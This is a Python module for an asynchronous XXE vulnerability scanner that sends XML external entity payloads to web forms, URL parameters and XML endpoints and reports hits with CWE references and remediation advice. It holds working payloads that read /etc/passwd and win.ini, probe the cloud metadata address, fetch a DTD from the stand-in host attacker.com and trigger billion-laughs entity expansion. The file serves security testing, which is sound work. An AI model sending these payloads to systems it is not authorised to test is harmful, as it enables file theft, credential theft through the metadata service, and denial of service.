"""
XXE (XML External Entity) Scanner
Tests for XML External Entity injection vulnerabilities
"""

import asyncio
from typing import List, Dict, Any
from urllib.parse import urlencode, urlparse, parse_qs


class XXEScanner:
    """Scanner for XXE vulnerabilities"""
    
    def __init__(self, config, session):
        """Initialize XXE scanner"""
        self.config = config
        self.session = session
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[Dict[str, Any]]:
        """Load XXE payloads"""
        return [
            {
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>''',
                'type': 'file-disclosure',
                'evidence': ['root:', 'bin/bash'],
            },
            {
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root><data>&xxe;</data></root>''',
                'type': 'file-disclosure-windows',
                'evidence': ['[extensions]', 'for 16-bit app support'],
            },
            {
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root><data>&xxe;</data></root>''',
                'type': 'ssrf',
                'evidence': ['ami-id', 'instance-id'],
            },
            {
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>
<root><data>test</data></root>''',
                'type': 'out-of-band',
                'evidence': [],
            },
            {
                'payload': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
]>
<root><data>&a2;</data></root>''',
                'type': 'billion-laughs',
                'evidence': [],
            },
        ]
    
    async def scan(self, target: str, recon_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan for XXE vulnerabilities"""
        vulnerabilities = []
        
        # Check if target accepts XML
        if not await self._accepts_xml(target):
            return vulnerabilities
        
        # Scan forms that might accept XML
        for form in recon_data.get('forms', []):
            form_vulns = await self._scan_form(target, form)
            vulnerabilities.extend(form_vulns)
        
        # Scan URL parameters
        for param in recon_data.get('inputs', []):
            if param.get('type') == 'url_param':
                param_vulns = await self._scan_url_param(target, param)
                vulnerabilities.extend(param_vulns)
        
        # Direct XML endpoint scan
        direct_vulns = await self._scan_direct(target)
        vulnerabilities.extend(direct_vulns)
        
        return vulnerabilities
    
    async def _accepts_xml(self, target: str) -> bool:
        """Check if target accepts XML content"""
        try:
            # Try sending XML content
            test_xml = '<?xml version="1.0"?><test>data</test>'
            headers = {'Content-Type': 'application/xml'}
            
            async with self.session.post(target, data=test_xml, headers=headers) as response:
                # If server accepts it without error, it might process XML
                return response.status in [200, 201, 202, 400, 500]
        except:
            return False
    
    async def _scan_direct(self, target: str) -> List[Dict[str, Any]]:
        """Scan endpoint directly with XXE payloads"""
        vulnerabilities = []
        
        for payload_info in self.payloads[:3]:  # Top 3 payloads
            payload = payload_info['payload']
            payload_type = payload_info['type']
            evidence_patterns = payload_info['evidence']
            
            try:
                headers = {'Content-Type': 'application/xml'}
                
                async with self.session.post(target, data=payload, headers=headers) as response:
                    content = await response.text()
                    
                    # Check for XXE
                    if self._is_vulnerable(content, evidence_patterns, response.status):
                        vulnerabilities.append({
                            'type': 'xxe',
                            'severity': 'critical',
                            'url': target,
                            'method': 'POST',
                            'xxe_type': payload_type,
                            'description': f'XXE ({payload_type}) vulnerability detected',
                            'evidence': self._extract_evidence(content, evidence_patterns),
                            'payload': payload,
                            'remediation': 'Disable external entity processing in XML parser',
                            'cwe': 'CWE-611',
                            'owasp': 'A05:2021 - Security Misconfiguration',
                        })
                        break
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    async def _scan_form(self, base_url: str, form: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan form for XXE"""
        vulnerabilities = []
        
        action = form.get('action', '')
        method = form.get('method', 'POST').upper()
        
        if method != 'POST':
            return vulnerabilities
        
        # Build form URL
        if action:
            from urllib.parse import urljoin
            form_url = urljoin(base_url, action)
        else:
            form_url = base_url
        
        # Try sending XXE payload as form data
        for payload_info in self.payloads[:2]:
            payload = payload_info['payload']
            payload_type = payload_info['type']
            evidence_patterns = payload_info['evidence']
            
            try:
                # Build form data with XML payload
                form_data = {}
                for inp in form.get('inputs', []):
                    inp_name = inp.get('name')
                    if inp_name:
                        form_data[inp_name] = payload
                
                # Send request
                async with self.session.post(form_url, data=form_data) as response:
                    content = await response.text()
                
                # Check for XXE
                if self._is_vulnerable(content, evidence_patterns, response.status):
                    vulnerabilities.append({
                        'type': 'xxe',
                        'severity': 'critical',
                        'url': form_url,
                        'method': method,
                        'xxe_type': payload_type,
                        'description': f'XXE ({payload_type}) vulnerability in form',
                        'evidence': self._extract_evidence(content, evidence_patterns),
                        'remediation': 'Disable external entity processing in XML parser',
                        'cwe': 'CWE-611',
                        'owasp': 'A05:2021 - Security Misconfiguration',
                    })
                    break
                
                # Also try with XML content-type
                headers = {'Content-Type': 'application/xml'}
                async with self.session.post(form_url, data=payload, headers=headers) as response:
                    content = await response.text()
                
                if self._is_vulnerable(content, evidence_patterns, response.status):
                    vulnerabilities.append({
                        'type': 'xxe',
                        'severity': 'critical',
                        'url': form_url,
                        'method': method,
                        'xxe_type': payload_type,
                        'description': f'XXE ({payload_type}) vulnerability in XML endpoint',
                        'evidence': self._extract_evidence(content, evidence_patterns),
                        'remediation': 'Disable external entity processing in XML parser',
                        'cwe': 'CWE-611',
                        'owasp': 'A05:2021 - Security Misconfiguration',
                    })
                    break
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    async def _scan_url_param(self, url: str, param: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Scan URL parameter for XXE"""
        vulnerabilities = []
        
        param_name = param.get('name')
        if not param_name:
            return vulnerabilities
        
        # Parse URL
        parsed = urlparse(url)
        
        # Test with XXE payloads
        for payload_info in self.payloads[:2]:
            payload = payload_info['payload']
            payload_type = payload_info['type']
            evidence_patterns = payload_info['evidence']
            
            try:
                # Try as URL parameter
                params = {param_name: payload}
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                async with self.session.get(test_url, params=params) as response:
                    content = await response.text()
                
                if self._is_vulnerable(content, evidence_patterns, response.status):
                    vulnerabilities.append({
                        'type': 'xxe',
                        'severity': 'critical',
                        'url': f"{test_url}?{urlencode(params)}",
                        'method': 'GET',
                        'parameter': param_name,
                        'xxe_type': payload_type,
                        'description': f'XXE ({payload_type}) vulnerability in URL parameter',
                        'evidence': self._extract_evidence(content, evidence_patterns),
                        'remediation': 'Disable external entity processing in XML parser',
                        'cwe': 'CWE-611',
                        'owasp': 'A05:2021 - Security Misconfiguration',
                    })
                    break
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def _is_vulnerable(self, content: str, evidence_patterns: List[str], status_code: int) -> bool:
        """Check if XXE vulnerability exists"""
        content_lower = content.lower()
        
        # Check for evidence patterns
        for pattern in evidence_patterns:
            if pattern.lower() in content_lower:
                return True
        
        # Check for error messages indicating XXE processing
        xxe_errors = [
            'java.io.FileNotFoundException',
            'System.IO.FileNotFoundException',
            'file not found',
            'no such file',
            'failed to load external entity',
            'external entity',
            'xml parsing error',
        ]
        
        for error in xxe_errors:
            if error.lower() in content_lower:
                return True
        
        return False
    
    def _extract_evidence(self, content: str, evidence_patterns: List[str], max_length: int = 300) -> str:
        """Extract evidence of XXE"""
        for pattern in evidence_patterns:
            if pattern.lower() in content.lower():
                try:
                    index = content.lower().index(pattern.lower())
                    start = max(0, index - 50)
                    end = min(len(content), index + len(pattern) + 100)
                    return content[start:end]
                except ValueError:
                    continue
        
        # Return first part of content as evidence
        return content[:max_length] if len(content) > max_length else content
